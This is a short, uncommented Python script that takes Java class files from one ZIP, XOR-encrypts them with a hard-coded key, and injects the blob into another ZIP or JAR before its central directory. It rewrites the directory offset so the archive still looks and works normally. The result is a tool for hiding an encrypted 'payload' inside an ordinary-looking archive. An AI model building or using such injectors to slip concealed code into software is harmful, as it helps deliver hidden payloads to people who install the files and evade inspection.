import struct
import sys
import os
import zipfile


source_zip = open(sys.argv[1], 'rb')
# source_payload = open(sys.argv[2], 'rb')
target_zip = open(sys.argv[3], 'wb')


source_data = source_zip.read(os.path.getsize(sys.argv[1]))
# payload_data = source_payload.read(os.path.getsize(sys.argv[2]))

# name_size name data_size data

payload = bytes()

pl = zipfile.ZipFile(sys.argv[2])
for cfile in pl.filelist:
    if cfile.is_dir():
        continue
    print(cfile.filename)
    fname = cfile.filename.replace('.class', '').replace('/', '.').encode()
    payload += struct.pack('<i', len(fname)) + fname + struct.pack('<i', cfile.file_size) + pl.read(cfile.filename)

payload = bytearray(payload)
key = b'FuCk'
for i in range(len(payload)):
    payload[i] = payload[i] ^ key[i%len(key)]


dir_offset = struct.unpack('<I', source_data[-6:-2])[0]
print(hex(dir_offset))

target_data = source_data[:dir_offset] + payload + struct.pack('<I', dir_offset) + source_data[dir_offset:]
target_data = target_data[:-6] + struct.pack('<I', dir_offset + len(payload) + 4) + bytes([0, 0])

target_zip.write(target_data)
